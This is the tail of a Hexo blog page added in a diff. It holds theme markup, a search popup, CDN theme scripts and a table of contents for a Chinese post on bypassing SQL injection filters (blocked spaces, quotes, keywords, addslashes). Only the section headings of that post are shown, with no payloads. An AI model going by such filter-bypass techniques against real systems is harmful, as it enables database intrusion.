+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <!-- use hexo-blog-encrypt -->
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">针对特殊字符限制的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC"><span class="nav-text">空格</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text">&#x2F;**&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#-1"><span class="nav-text">()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%97%E5%8F%B7-%EF%BC%8C"><span class="nav-text">逗号  ，</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%AF%AD%E6%B3%95%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-text">使用语法绕过：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#substr-mid"><span class="nav-text">substr&#x2F;mid</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%94%E8%BE%83%E7%AC%A6-lt-gt"><span class="nav-text">比较符 &lt; &gt;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#greatest%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">greatest函数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#-2"><span class="nav-text">&#x3D;, !&#x3D;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%89%E5%8F%B7"><span class="nav-text">等号   &#x3D;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-%E2%80%98"><span class="nav-text">单引号  ‘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%AC%E5%8F%B7-%EF%BC%88-%EF%BC%89"><span class="nav-text">括号 （  ）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A6%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-text">左括号过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%B3%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-text">右括号过滤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E5%85%B3%E9%94%AE%E5%AD%97%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">针对关键字限制的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#or-and"><span class="nav-text">or and</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#substr"><span class="nav-text">substr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hex"><span class="nav-text">hex</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union-select"><span class="nav-text">union\select</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where"><span class="nav-text">where</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#limit"><span class="nav-text">limit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group-by"><span class="nav-text">group by</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87addslashes"><span class="nav-text">绕过addslashes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E5%86%85%E8%81%94%E7%BB%95%E6%89%80%E6%9C%89"><span class="nav-text">关键字内联绕所有</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/local-search.min.js"></script>
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
